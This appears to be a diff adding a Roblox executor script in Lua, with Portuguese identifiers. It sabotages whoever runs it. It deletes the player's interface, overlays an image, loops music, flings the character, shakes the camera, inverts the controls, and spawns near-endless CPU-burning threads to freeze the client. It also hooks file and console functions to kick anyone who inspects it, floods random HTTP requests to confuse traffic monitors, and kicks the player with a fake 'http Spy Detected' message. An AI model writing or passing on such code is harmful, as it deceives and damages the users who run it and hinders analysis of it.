@@ -1,0 +1,303 @@
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local CoreGui = game:GetService("CoreGui")
+local SoundService = game:GetService("SoundService")
+local LocalPlayer = Players.LocalPlayer
+
+local CONFIG = {
+    forcaBase = 9287262727982,
+    multiplicador = 1000,
+    repeticoes = 100,
+    intensidade = 12,
+    velocidade = 100,
+    guiNome = "TrollImage",
+    imagemId = "rbxassetid://88714950022261",
+    delayLag = 1,
+}
+
+local function gerarStringAleatoria(tamanho)
+    local resultado = ""
+    for i = 1, tamanho do
+        resultado = resultado .. string.char(math.random(97, 122))
+    end
+    return resultado
+end
+
+local function removerOutrasGUIs(container)
+    for _, obj in ipairs(container:GetChildren()) do
+        if obj.Name ~= CONFIG.guiNome then
+            pcall(obj.Destroy, obj)
+        end
+    end
+end
+
+local function criarGuiImagem()
+    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
+    
+    removerOutrasGUIs(CoreGui)
+    removerOutrasGUIs(playerGui)
+    
+    local gui = Instance.new("ScreenGui")
+    gui.Name = CONFIG.guiNome
+    gui.ResetOnSpawn = false
+    gui.IgnoreGuiInset = true
+    gui.DisplayOrder = 999999
+    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+    gui.Parent = playerGui
+    
+    local image = Instance.new("ImageLabel")
+    image.Name = "RobloxImage"
+    image.AnchorPoint = Vector2.new(0.5, 0.5)
+    image.Position = UDim2.fromScale(0.5, 0.85)
+    image.Size = UDim2.fromScale(0.70, 0.70)
+    image.BackgroundTransparency = 1
+    image.Image = CONFIG.imagemId
+    image.ScaleType = Enum.ScaleType.Fit
+    image.ZIndex = 999999
+    image.Parent = gui
+    
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 18)
+    corner.Parent = image
+    
+    return gui
+end
+
+local function tocarMusicas()
+    local function criarSound(id)
+        local sound = Instance.new("Sound")
+        sound.SoundId = "rbxassetid://" .. tostring(id)
+        sound.Volume = 1
+        sound.Parent = SoundService
+        return sound
+    end
+    
+    local music1 = criarSound(137836523944133)
+    music1:Play()
+    repeat task.wait(0.1) until music1.TimePosition >= 7 or not music1.IsPlaying
+    music1:Destroy()
+    
+    local music2 = criarSound(124520821444918)
+    music2:Play()
+    music2.Ended:Wait()
+    music2:Destroy()
+    
+    local music3 = criarSound(137783553081376)
+    music3:Play()
+    repeat task.wait(0.1) until music3.TimePosition >= 6 or not music3.IsPlaying
+    music3:Destroy()
+    
+    local music4 = criarSound(106240568414882)
+    music4:Play()
+    music4.Ended:Wait()
+    music4:Destroy()
+    
+    local music5 = criarSound(87482445723253)
+    while true do
+        music5.TimePosition = 0
+        music5:Play()
+        music5.Ended:Wait()
+    end
+end
+
+local function iniciarManutencaoGUI(gui)
+    task.spawn(function()
+        while task.wait(3) do
+            local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
+            
+            if not gui.Parent then
+                gui.Parent = playerGui
+            end
+            
+            removerOutrasGUIs(CoreGui)
+            
+            if playerGui then
+                removerOutrasGUIs(playerGui)
+            end
+            
+            if playerGui and not playerGui:FindFirstChild(CONFIG.guiNome) then
+                gui.Parent = playerGui
+            end
+        end
+    end)
+end
+
+local function aplicarSuperPulo(character)
+    local root = character:WaitForChild("HumanoidRootPart")
+    
+    for i = 1, CONFIG.repeticoes do
+        if root and root.Parent then
+            local attachment = Instance.new("Attachment")
+            attachment.Parent = root
+            
+            local velocity = Instance.new("LinearVelocity")
+            velocity.Attachment0 = attachment
+            velocity.MaxForce = math.huge
+            velocity.VectorVelocity = Vector3.new(
+                0,
+                CONFIG.forcaBase * CONFIG.multiplicador,
+                0
+            )
+            velocity.RelativeTo = Enum.ActuatorRelativeTo.World
+            velocity.Parent = root
+            
+            task.wait(0.01)
+            
+            velocity:Destroy()
+            attachment:Destroy()
+        end
+    end
+end
+
+local function iniciarTremorCamera()
+    local conexao = RunService.RenderStepped:Connect(function()
+        local camera = workspace.CurrentCamera
+        if not camera then return end
+        
+        local x = (math.random() - 0.5) * CONFIG.intensidade
+        local y = (math.random() - 0.5) * CONFIG.intensidade
+        local z = (math.random() - 0.5) * CONFIG.intensidade
+        
+        camera.CFrame = camera.CFrame * CFrame.Angles(
+            math.rad(x * CONFIG.velocidade),
+            math.rad(y * CONFIG.velocidade),
+            math.rad(z * CONFIG.velocidade)
+        )
+    end)
+    
+    return conexao
+end
+
+local function inverterControles(character)
+    local humanoid = character:WaitForChild("Humanoid")
+    
+    local conexao = RunService.RenderStepped:Connect(function()
+        if not character.Parent or humanoid.Health <= 0 then
+            conexao:Disconnect()
+            return
+        end
+        
+        local move = humanoid.MoveDirection
+        if move.Magnitude > 0 then
+            humanoid:Move(-move, false)
+        end
+    end)
+end
+
+local function iniciarLag()
+    local running = true
+    
+    task.wait(CONFIG.delayLag)
+    
+    for _ = 1, 999999999 do
+        task.spawn(function()
+            while running do
+                local total = 0
+                for i = 1, 999999999999 do
+                    total = total + math.random()
+                end
+                task.wait()
+            end
+        end)
+    end
+end
+
+local AntiHookFunction = true
+
+RunService.RenderStepped:Connect(function()
+    if AntiHookFunction then
+        loadstring("local " .. gerarStringAleatoria(math.random(1, 8)) .. " = \"" .. gerarStringAleatoria(math.random(1, 8)) .. "\"")()
+    end
+end)
+
+RunService.RenderStepped:Connect(function()
+    if AntiHookFunction then
+        task.spawn(function()
+            pcall(function()
+                local request = request or http_request or (syn and syn.request) or (fluxus and fluxus.request) or (getgenv and getgenv().request) or (http and http.request)
+                local url = "https://" .. gerarStringAleatoria(math.random(8, 16)) .. ".com"
+                local fetchtype = math.random(1, 2)
+                
+                if fetchtype == 1 then
+                    request({ Url = url, Method = "GET" })
+                else
+                    game:HttpGet(url)
+                end
+            end)
+        end)
+    end
+end)
+
+pcall(function()
+    getgenv().hookfunction = function()
+        error("Not Supported.")
+    end
+    if setreadonly and getgenv then
+        setreadonly(getgenv(), true)
+    end
+end)
+
+local funcoes = {
+    rconsoleprint,
+    print,
+    warn,
+    error,
+    setclipboard,
+    writefile,
+    appendfile,
+    delfile,
+    readfile,
+    isfile,
+    isfolder,
+    listfiles,
+    getcustomasset,
+    rconsoleerr,
+    rconsolewarn,
+    makefolder
+}
+
+task.spawn(function()
+    for _, func in ipairs(funcoes) do
+        pcall(function()
+            local oldFunc = hookfunction(func, function(...)
+                if AntiHookFunction then
+                    local args = {...}
+                    for _, arg in ipairs(args) do
+                        if tostring(arg):find("local") then
+                            LocalPlayer:Kick("Hook Function Detected!")
+                            return nil
+                        end
+                    end
+                end
+                return oldFunc(...)
+            end)
+        end)
+    end
+    
+    task.wait(67)
+    AntiHookFunction = false
+end)
+
+task.delay(8, function()
+    LocalPlayer:Kick("401 | http Spy Detected")
+end)
+
+local function main()
+    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    
+    local gui = criarGuiImagem()
+    iniciarManutencaoGUI(gui)
+    
+    task.spawn(tocarMusicas)
+    
+    aplicarSuperPulo(character)
+    
+    iniciarTremorCamera()
+    
+    inverterControles(character)
+    LocalPlayer.CharacterAdded:Connect(inverterControles)
+    
+    iniciarLag()
+end
+
+pcall(main)
